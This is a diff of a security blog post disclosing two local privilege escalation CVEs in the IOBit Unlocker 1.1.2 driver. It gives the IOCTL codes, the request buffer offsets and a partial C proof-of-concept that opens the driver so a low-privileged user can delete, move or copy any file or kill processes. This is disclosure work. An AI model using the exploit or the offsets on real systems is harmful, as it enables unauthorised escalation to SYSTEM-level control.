@@ -1,567 +1,263 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-
 <head>
-  <title>
-  CVE-2020-14974 &amp; CVE-2020-14975 - IOBit Unlocker 1.1.2 - Local Privilege Escalation · theevilbit blog
-</title>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="color-scheme" content="light dark">
-
-
-
-
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CVE-2020-14974 &amp; CVE-2020-14975 - IOBit Unlocker 1.1.2 - Local Privilege Escalation · theevilbit</title>
+<meta name="description" content="IOBit’s Unlocker program is advertised to solve the following issues:">
 <meta name="author" content="Csaba Fitzl">
-<meta name="description" content="IOBit’s Unlocker program is advertised to solve the following issues:
-
-IObit Unlocker performs well in solving “cannot delete files”, “access is denied”, “The file is in use by another program or user”, or “There has been a sharing violation” problems. With IObit Unlocker, you can manage all your files the way you want.
-
-and even:
-
-With “Unlock &amp; Delete”, “Unlock &amp; Rename”, “Unlock &amp; Move”, and “Unlock &amp; Copy”, IObit Unlocker offers easier ways to unlock and manage the files and folders to keep them safe and available.">
-<meta name="keywords" content="blog,macos,apple,security,vulnerability,exploit,cve">
-
-
-
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="CVE-2020-14974 & CVE-2020-14975 - IOBit Unlocker 1.1.2 - Local Privilege Escalation">
-  <meta name="twitter:description" content="IOBit’s Unlocker program is advertised to solve the following issues:
-IObit Unlocker performs well in solving “cannot delete files”, “access is denied”, “The file is in use by another program or user”, or “There has been a sharing violation” problems. With IObit Unlocker, you can manage all your files the way you want.
-and even:
-With “Unlock &amp; Delete”, “Unlock &amp; Rename”, “Unlock &amp; Move”, and “Unlock &amp; Copy”, IObit Unlocker offers easier ways to unlock and manage the files and folders to keep them safe and available.">
-
-<meta property="og:url" content="https://theevilbit.github.io/posts/iobit_unlocker_lpe/">
-  <meta property="og:site_name" content="theevilbit blog">
-  <meta property="og:title" content="CVE-2020-14974 & CVE-2020-14975 - IOBit Unlocker 1.1.2 - Local Privilege Escalation">
-  <meta property="og:description" content="IOBit’s Unlocker program is advertised to solve the following issues:
-IObit Unlocker performs well in solving “cannot delete files”, “access is denied”, “The file is in use by another program or user”, or “There has been a sharing violation” problems. With IObit Unlocker, you can manage all your files the way you want.
-and even:
-With “Unlock &amp; Delete”, “Unlock &amp; Rename”, “Unlock &amp; Move”, and “Unlock &amp; Copy”, IObit Unlocker offers easier ways to unlock and manage the files and folders to keep them safe and available.">
-  <meta property="og:locale" content="en">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2019-10-12T00:00:00+00:00">
-    <meta property="article:modified_time" content="2019-10-12T00:00:00+00:00">
-    <meta property="article:tag" content="Lpe">
-    <meta property="article:tag" content="Vulnerability">
-
-
-
-
 <link rel="canonical" href="https://theevilbit.github.io/posts/iobit_unlocker_lpe/">
-
-
-<link rel="preload" href="https://theevilbit.github.io/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
-<link rel="preload" href="https://theevilbit.github.io/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
-<link rel="preload" href="https://theevilbit.github.io/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
-
-
-  
-  
-  <link rel="stylesheet" href="https://theevilbit.github.io/css/coder.min.4410e480b3bad72c110a96b56e5aa8c36c24a0f3735b278818123b0fa4393fcd.css" integrity="sha256-RBDkgLO61ywRCpa1blqow2wkoPNzWyeIGBI7D6Q5P80=" crossorigin="anonymous" media="screen" />
-
-
-
-
-
-
-  
-    
-    
-    <link rel="stylesheet" href="https://theevilbit.github.io/css/coder-dark.min.ad48f476275974885bdc03d5251e3cdbe1678c54a63ff772376b0ed2adc468dd.css" integrity="sha256-rUj0didZdIhb3APVJR482&#43;FnjFSmP/dyN2sO0q3EaN0=" crossorigin="anonymous" media="screen" />
-  
-
-
-
- 
-
-
-
-
-<link rel="icon" type="image/svg+xml" href="https://theevilbit.github.io/images/favicon.svg" sizes="any">
-<link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-32x32.png" sizes="32x32">
-<link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-16x16.png" sizes="16x16">
-
-<link rel="apple-touch-icon" href="https://theevilbit.github.io/images/apple-touch-icon.png">
-<link rel="apple-touch-icon" sizes="180x180" href="https://theevilbit.github.io/images/apple-touch-icon.png">
-
-<link rel="manifest" href="https://theevilbit.github.io/site.webmanifest">
-<link rel="mask-icon" href="https://theevilbit.github.io/images/safari-pinned-tab.svg" color="#5bbad5">
-
-
-
-
-
-
-
-
-
+<link rel="alternate" type="application/rss+xml" title="theevilbit" href="/index.xml">
+<link rel="icon" href="/favicon.svg" type="image/svg+xml">
+<script>try { var t = localStorage.getItem("tb.theme"); document.documentElement.dataset.theme = t || "dark"; } catch (e) { document.documentElement.dataset.theme = "dark"; }</script>
+<link rel="preload" href="/fonts/IBMPlexSans-var.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="stylesheet" href="/fonts.css?v=1791269065">
+<link rel="stylesheet" href="/style.css?v=1791269065">
 </head>
-
-
-
-
-
-
-<body class="preload-transitions colorscheme-auto">
-  
-<div class="float-container">
-    <a id="dark-mode-toggle" class="colorscheme-toggle">
-        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
-    </a>
-</div>
-
-
-  <main class="wrapper">
-    <nav class="navigation">
-  <section class="container">
-    
-    <a class="navigation-title" href="https://theevilbit.github.io/">
-      theevilbit blog
-    </a>
-    
-    
-      <input type="checkbox" id="menu-toggle" />
-      <label class="menu-button float-right" for="menu-toggle">
-        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
-      </label>
-      <ul class="navigation-list">
-        
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="https://theevilbit.github.io/posts/">Posts</a>
-            </li>
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="https://theevilbit.github.io/talks/">Talks and Workshops</a>
-            </li>
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="https://theevilbit.github.io/shield/">Shield.app</a>
-            </li>
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="https://theevilbit.github.io/beyond/">Beyond good ol&#39; LaunchAgents</a>
-            </li>
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="https://theevilbit.github.io/tags/">Tags</a>
-            </li>
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="https://theevilbit.github.io/about/">About</a>
-            </li>
-          
-        
-        
-      </ul>
-    
-  </section>
-</nav>
-
-
-    <div class="content">
-      
-  <section class="container post">
-    <article>
-      <header>
-        <div class="post-title">
-          <h1 class="title">
-            <a class="title-link" href="https://theevilbit.github.io/posts/iobit_unlocker_lpe/">
-              CVE-2020-14974 &amp; CVE-2020-14975 - IOBit Unlocker 1.1.2 - Local Privilege Escalation
-            </a>
-          </h1>
-        </div>
-        <div class="post-meta">
-          <div class="date">
-            <span class="posted-on">
-              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
-              <time datetime="2019-10-12T00:00:00Z">
-                October 12, 2019
-              </time>
-            </span>
-            <span class="reading-time">
-              <i class="fa-solid fa-clock" aria-hidden="true"></i>
-              7-minute read
-            </span>
-          </div>
-          
-          <div class="categories">
-  <i class="fa-solid fa-folder" aria-hidden="true"></i>
-    <a href="https://theevilbit.github.io/categories/blog/">BLOG</a></div>
-
-          <div class="tags">
-  <i class="fa-solid fa-tag" aria-hidden="true"></i>
-    <span class="tag">
-      <a href="https://theevilbit.github.io/tags/lpe/">Lpe</a>
-    </span>
-      <span class="separator">•</span>
-    <span class="tag">
-      <a href="https://theevilbit.github.io/tags/vulnerability/">Vulnerability</a>
-    </span></div>
-
-        </div>
-      </header>
-
-      <div class="post-content">
-        
-        <p>IOBit’s Unlocker program is advertised to solve the following issues:</p>
-<blockquote>
-<p>IObit Unlocker performs well in solving “cannot delete files”, “access is denied”, “The file is in use by another program or user”, or “There has been a sharing violation” problems. With IObit Unlocker, you can manage all your files the way you want.</p>
-</blockquote>
+<body>
+<div class="wrap">
+  <header class="top">
+    <a class="brand" href="/">the<span>evil</span>bit<i class="cursor"></i></a>
+    <nav class="nav"><a href="/posts/" class=on>Posts</a><a href="/beyond/">Beyond</a><a href="/talks/">Talks</a><a href="/shield/">Shield</a><a href="/about/">About</a><a href="/tags/">Tags</a></nav>
+    <button type="button" class="theme" id="theme" aria-label="switch light / dark">◐</button>
+  </header>
+  <main><article class="post">
+<header class="post-head"><h1>CVE-2020-14974 &amp; CVE-2020-14975 - IOBit Unlocker 1.1.2 - Local Privilege Escalation</h1>
+<div class="meta"><time datetime="2019-10-12">Oct 12, 2019</time><span>6 min read</span><span class="tags"><a class="tag" href="/tags/lpe/">lpe</a><a class="tag" href="/tags/vulnerability/">vulnerability</a></span></div></header>
+<div class="prose"><p>IOBit’s Unlocker program is advertised to solve the following issues:</p>
+<blockquote><p>IObit Unlocker performs well in solving “cannot delete files”, “access is denied”, “The file is in use by another program or user”, or “There has been a sharing violation” problems. With IObit Unlocker, you can manage all your files the way you want.  </p></blockquote>
 <p>and even:</p>
-<blockquote>
-<p>With “Unlock &amp; Delete”, “Unlock &amp; Rename”, “Unlock &amp; Move”, and “Unlock &amp; Copy”, IObit Unlocker offers easier ways to unlock and manage the files and folders to keep them safe and available.</p>
-</blockquote>
-<p>It can be downloaded from here: <a href="https://www.iobit.com/en/iobit-unlocker.php"  class="external-link" target="_blank" rel="noopener">IObit Unlocker, Solution for “undelete files or folders” Problems on Windows 8, 7, Vista, XP, 10 - IObit</a>. Right now the latest version is 1.1.2.</p>
-<h2 id="overview">
-  Overview
-  <a class="heading-link" href="#overview">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h2>
+<blockquote><p>With “Unlock &amp; Delete”, “Unlock &amp; Rename”, “Unlock &amp; Move”, and “Unlock &amp; Copy”, IObit Unlocker offers easier ways to unlock and manage the files and folders to keep them safe and available.  </p></blockquote>
+<p>It can be downloaded from here: <a href="https://www.iobit.com/en/iobit-unlocker.php" rel="noopener">IObit Unlocker, Solution for “undelete files or folders” Problems on Windows 8, 7, Vista, XP, 10 - IObit</a>. Right now the latest version is 1.1.2.</p>
+<h2 id="overview">Overview<a class="anchor" href="#overview" aria-label="link to this section">#</a></h2>
 <p>The IOBitUnlocker driver contains 2 major vulnerabilities:</p>
-<ol>
-<li>The IOCTL code 0x222124 in the IOBitUnlocker driver allows a low privileged user to unlock a file - kill processes that holds a handle to the process, even if they are running with SYSTEM privileges (CVE-2020-14974)</li>
-<li>The IOCTL code 0x222124 in the IOBitUnlocker driver allows a low privileged user to delete, move or copy any file on the system (CVE-2020-14975)</li>
-</ol>
-<h2 id="vulnerability-details">
-  Vulnerability Details
-  <a class="heading-link" href="#vulnerability-details">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h2>
+<ol><li>The IOCTL code 0x222124 in the IOBitUnlocker driver allows a low privileged user to unlock a file - kill processes that holds a handle to the process, even if they are running with SYSTEM privileges (CVE-2020-14974)</li><li>The IOCTL code 0x222124 in the IOBitUnlocker driver allows a low privileged user to delete, move or copy any file on the system (CVE-2020-14975)</li></ol>
+<h2 id="vulnerability-details">Vulnerability Details<a class="anchor" href="#vulnerability-details" aria-label="link to this section">#</a></h2>
 <p>The application installs a helper driver that will perform the above actions. If we examine the permissions of the device in OSR’s Device Tree, we can see that everyone has full access to the driver:</p>
-<p><img src="https://theevilbit.github.io/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2015.56.38.png" alt=""></p>
+<p><img src="/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2015.56.38.png" alt="" loading="lazy"></p>
 <p>Interestingly, when we start up the client application it will prompt for elevated access:</p>
-<p><img src="https://theevilbit.github.io/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2015.53.11.png" alt=""></p>
-<p>To see what the client does, or how does it perform the actions, we can go with reversing the driver, but it’s easier to use @zodiacon’s <a href="https://github.com/zodiacon/DriverMon"  class="external-link" target="_blank" rel="noopener">DriverMon</a> tool, which can monitor IOCTL requests for us, and also show the data going on.</p>
+<p><img src="/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2015.53.11.png" alt="" loading="lazy"></p>
+<p>To see what the client does, or how does it perform the actions, we can go with reversing the driver, but it’s easier to use @zodiacon’s <a href="https://github.com/zodiacon/DriverMon" rel="noopener">DriverMon</a> tool, which can monitor IOCTL requests for us, and also show the data going on.</p>
 <p>As we add files, we can see that there is an IOCTL code that seemingly seems to query information about the file - if any process is using it or not. This uses IOCTL code <code>0x222128</code>.</p>
-<p><img src="https://theevilbit.github.io/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2016.04.14.png" alt=""></p>
+<p><img src="/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2016.04.14.png" alt="" loading="lazy"></p>
 <p>If yes, we will get back the PID of the process using the file:</p>
-<p><img src="https://theevilbit.github.io/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2016.05.14.png" alt=""></p>
+<p><img src="/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2016.05.14.png" alt="" loading="lazy"></p>
 <p>If we click unlock, we will see a slightly different request, using IOCTL <code>0x222124</code>, again passing the filename and also number 3 at offset 0x424:</p>
-<p><img src="https://theevilbit.github.io/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2016.10.06.png" alt=""></p>
+<p><img src="/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2016.10.06.png" alt="" loading="lazy"></p>
 <p>If we look at the driver file in IDA, we will see that these are the two IOCTL code it will support.</p>
-<p><img src="https://theevilbit.github.io/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2016.12.57.png" alt=""></p>
+<p><img src="/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2016.12.57.png" alt="" loading="lazy"></p>
 <p>Playing around with the other option, this is what we can see in the requests in the relevant offsets:</p>
-<ol>
-<li>Unlock:
-<ol>
-<li>0x0: filename in unicode</li>
-<li>0x424: byte 0x3</li>
-</ol>
-</li>
-<li>Unlock and Delete:
-<ol>
-<li>0x0: filename in unicode</li>
-<li>0x420: byte 0x1</li>
-<li>0x424: byte 0x3</li>
-</ol>
-</li>
-<li>Unlock and rename:
-<ol>
-<li>0x0: filename</li>
-<li>0x210: new filename</li>
-<li>0x420: byte 0x2</li>
-<li>0x424: byte 0x3</li>
-</ol>
-</li>
-<li>Unlock and move:
-<ol>
-<li>0x0: filename</li>
-<li>0x210: new filename with full path</li>
-<li>0x420: byte 0x3</li>
-<li>0x424: byte 0x3</li>
-</ol>
-</li>
-<li>Unlock and copy:
-<ol>
-<li>0x0: filename</li>
-<li>0x210: new filename with full path</li>
-<li>0x420: byte 0x4</li>
-<li>0x424: byte 0x3</li>
-</ol>
-</li>
-</ol>
+<ol><li>Unlock:
+  1. 0x0: filename in unicode
+  2. 0x424: byte 0x3</li><li>Unlock and Delete:
+  1. 0x0: filename in unicode
+  2. 0x420: byte 0x1
+  3. 0x424: byte 0x3</li><li>Unlock and rename:
+  1. 0x0: filename
+  2. 0x210: new filename
+  3. 0x420: byte 0x2
+  4. 0x424: byte 0x3</li><li>Unlock and move:
+  1. 0x0: filename
+  2. 0x210: new filename with full path
+  3. 0x420: byte 0x3
+  4. 0x424: byte 0x3</li><li>Unlock and copy:
+  1. 0x0: filename
+  2. 0x210: new filename with full path
+  3. 0x420: byte 0x4
+  4. 0x424: byte 0x3</li></ol>
 <p>This is the input of a file rename operation:</p>
-<p><img src="https://theevilbit.github.io/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2023.53.48.png" alt=""></p>
+<p><img src="/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2023.53.48.png" alt="" loading="lazy"></p>
 <p>If we click <code>Force mode</code> the byte at offset 0x424 is set to 0x7. All the other bytes are 0 in the request. We can also conclude that the tool doesn’t support file paths over 256 bytes, which is the typical MAX_PATH value.
 I believe the 4 byte return value is the NTSTATUS code. If we select a folder instead of a file, we got the same input values.</p>
 <p>Considering that the access to the driver is full access to everyone, we can reimplement the same functionality in a code. This is a clear privilege escalation vulnerability as we can:</p>
-<ol>
-<li>delete, copy, move any file in the system</li>
-<li>kill any process (the unlock feature will terminate processes holding handles to the file) - almost any, if we look at the code, we can see that there is a whitelist for critical system processes:</li>
-</ol>
-<p><img src="https://theevilbit.github.io/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2016.31.17.png" alt=""></p>
+<ol><li>delete, copy, move any file in the system</li><li>kill any process (the unlock feature will terminate processes holding handles to the file) - almost any, if we look at the code, we can see that there is a whitelist for critical system processes:</li></ol>
+<p><img src="/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2016.31.17.png" alt="" loading="lazy"></p>
 <p>The possibilities are endless with these capabilities. For example we can easily replace any binary running as SYSTEM, or copy a DLL to a location where it will be loaded as SYSTEM.</p>
 <p>The only item that doesn’t work is renaming the file, for some reason if the user doesn’t have rights, the driver can’t rename it. All other items work.</p>
 <p>Proof-of-concept C code:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// UnlockExploit.cpp : This file contains the &#39;main&#39; function. Program execution begins and ends there.
-</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">//
-</span></span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;iostream&gt;</span><span style="color:#099">
-</span></span></span><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;windows.h&gt;</span><span style="color:#099">
-</span></span></span><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;stdio.h&gt;</span><span style="color:#099">
-</span></span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>BOOL <span style="color:#c0f">FileExists</span>(LPCWSTR szPath)
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>	DWORD dwAttrib <span style="color:#555">=</span> <span style="color:#c0f">GetFileAttributesW</span>(szPath);
-</span></span><span style="display:flex;"><span>	<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[i] File exists status: 0x%08x</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, dwAttrib);
-</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">return</span> (dwAttrib <span style="color:#555">!=</span> INVALID_FILE_ATTRIBUTES);
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">ReadStringFromSTDIN</span>(<span style="color:#078;font-weight:bold">wchar_t</span> <span style="color:#555">*</span> buffer)
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>	<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;&gt; &#34;</span>);
-</span></span><span style="display:flex;"><span>	<span style="color:#c0f">fgetws</span>((<span style="color:#078;font-weight:bold">wchar_t</span><span style="color:#555">*</span>)buffer, <span style="color:#f60">0x200</span>, stdin);
-</span></span><span style="display:flex;"><span>	<span style="color:#c0f">memset</span>((LPVOID)((SIZE_T)buffer <span style="color:#555">+</span> (<span style="color:#c0f">lstrlenW</span>((LPCWSTR)buffer) <span style="color:#555">*</span> <span style="color:#069;font-weight:bold">sizeof</span>(WCHAR) <span style="color:#555">-</span> <span style="color:#069;font-weight:bold">sizeof</span>(WCHAR))), <span style="color:#f60">0x00</span>, <span style="color:#069;font-weight:bold">sizeof</span>(WCHAR)); <span style="color:#09f;font-style:italic">//remove end of line character
-</span></span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">int</span> <span style="color:#c0f">main</span>(<span style="color:#078;font-weight:bold">int</span> argc, <span style="color:#078;font-weight:bold">char</span><span style="color:#555">*</span> argv[]) {
-</span></span><span style="display:flex;"><span>	<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[i] IOBit Unlocker Privilege Escalation PoC</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#09f;font-style:italic">//open the driver
-</span></span></span><span style="display:flex;"><span>	HANDLE hDriver <span style="color:#555">=</span> <span style="color:#c0f">CreateFileW</span>(<span style="color:#c30">L</span><span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\\\\</span><span style="color:#c30">.</span><span style="color:#c30;font-weight:bold">\\</span><span style="color:#c30">IOBitUnlockerDevice&#34;</span>, GENERIC_READ <span style="color:#555">|</span> GENERIC_WRITE, <span style="color:#f60">0</span>, <span style="color:#366">NULL</span>, OPEN_EXISTING, <span style="color:#f60">0</span>, <span style="color:#366">NULL</span>);
-</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">if</span> (hDriver <span style="color:#555">!=</span> INVALID_HANDLE_VALUE)
-</span></span><span style="display:flex;"><span>	{
-</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[+] opened handle to the driver</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		DWORD input_buffer_size <span style="color:#555">=</span> <span style="color:#f60">0x1000</span>;
-</span></span><span style="display:flex;"><span>		DWORD output_buffer_size <span style="color:#555">=</span> <span style="color:#f60">0x1000</span>;
-</span></span><span style="display:flex;"><span>		<span style="color:#09f;font-style:italic">//allocate input buffer
-</span></span></span><span style="display:flex;"><span>		LPVOID input_buffer <span style="color:#555">=</span> <span style="color:#c0f">VirtualAlloc</span>(<span style="color:#366">NULL</span>, (SIZE_T)input_buffer_size, MEM_RESERVE <span style="color:#555">|</span> MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">if</span> (input_buffer <span style="color:#555">==</span> <span style="color:#366">NULL</span>)
-</span></span><span style="display:flex;"><span>		{
-</span></span><span style="display:flex;"><span>			<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[-] Unable to allocate memory for input buffer</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
-</span></span><span style="display:flex;"><span>			<span style="color:#c0f">ExitProcess</span>(<span style="color:#555">-</span><span style="color:#f60">1</span>);
-</span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[+] Allocated input memory buffer at: 0x%Ix</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, (UINT64)input_buffer);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		<span style="color:#09f;font-style:italic">//allocate output buffer
-</span></span></span><span style="display:flex;"><span>		LPVOID output_buffer <span style="color:#555">=</span> <span style="color:#c0f">VirtualAlloc</span>(<span style="color:#366">NULL</span>, (SIZE_T)output_buffer_size, MEM_RESERVE <span style="color:#555">|</span> MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">if</span> (output_buffer <span style="color:#555">==</span> <span style="color:#366">NULL</span>)
-</span></span><span style="display:flex;"><span>		{
-</span></span><span style="display:flex;"><span>			<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[-] Unable to allocate memory for output buffer</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
-</span></span><span style="display:flex;"><span>			<span style="color:#c0f">ExitProcess</span>(<span style="color:#555">-</span><span style="color:#f60">1</span>);
-</span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[+] Allocated output buffer memory at: 0x%Ix</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, (UINT64)output_buffer);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		<span style="color:#09f;font-style:italic">// Clear memory area
-</span></span></span><span style="display:flex;"><span>		<span style="color:#c0f">memset</span>(input_buffer, <span style="color:#f60">0x00</span>, input_buffer_size); 
-</span></span><span style="display:flex;"><span>		<span style="color:#c0f">memset</span>(output_buffer, <span style="color:#f60">0x00</span>, output_buffer_size);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[i] Enter full path for the file to unlock. Eg: C:</span><span style="color:#c30;font-weight:bold">\\</span><span style="color:#c30">Windows</span><span style="color:#c30;font-weight:bold">\\</span><span style="color:#c30">System32</span><span style="color:#c30;font-weight:bold">\\</span><span style="color:#c30">cmd.exe</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#c0f">ReadStringFromSTDIN</span>((<span style="color:#078;font-weight:bold">wchar_t</span><span style="color:#555">*</span>)input_buffer);
-</span></span><span style="display:flex;"><span>		<span style="color:#c0f">wprintf</span>(<span style="color:#c30">L</span><span style="color:#c30">&#34;Fileto be checked: %s</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, (<span style="color:#078;font-weight:bold">wchar_t</span> <span style="color:#555">*</span>)input_buffer);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">!</span><span style="color:#c0f">FileExists</span>((LPCWSTR)input_buffer)) {
-</span></span><span style="display:flex;"><span>			<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[-] This file doesn&#39;t exists</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
-</span></span><span style="display:flex;"><span>			<span style="color:#c0f">ExitProcess</span>(<span style="color:#555">-</span><span style="color:#f60">1</span>);
-</span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		<span style="color:#09f;font-style:italic">//print options
-</span></span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[+] File found!</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[i] Choose an option:</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;1 - INFO</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;2 - Unlock</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;3 - Unlock &amp; Delete</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;4 - Unlock &amp; Rename</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;5 - Unlock &amp; Move</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;6 - Unlock &amp; Copy</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
-</span></span><span style="display:flex;"><span>		
-</span></span><span style="display:flex;"><span>		boolean valid <span style="color:#555">=</span> <span style="color:#366">false</span>;
-</span></span><span style="display:flex;"><span>		<span style="color:#078;font-weight:bold">int</span> option <span style="color:#555">=</span> <span style="color:#f60">0</span>;
-</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">while</span> (<span style="color:#555">!</span>valid)
-</span></span><span style="display:flex;"><span>		{
-</span></span><span style="display:flex;"><span>			<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;&gt; &#34;</span>);
-</span></span><span style="display:flex;"><span>			<span style="color:#078;font-weight:bold">int</span> result <span style="color:#555">=</span> <span style="color:#c0f">scanf_s</span>(<span style="color:#c30">&#34;%d&#34;</span>, <span style="color:#555">&amp;</span>option);
-</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">if</span> (result <span style="color:#555">==</span> EOF) {
-</span></span><span style="display:flex;"><span>				<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[-] Invalid input</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
-</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">continue</span>;
-</span></span><span style="display:flex;"><span>			}
-</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">if</span> (result <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
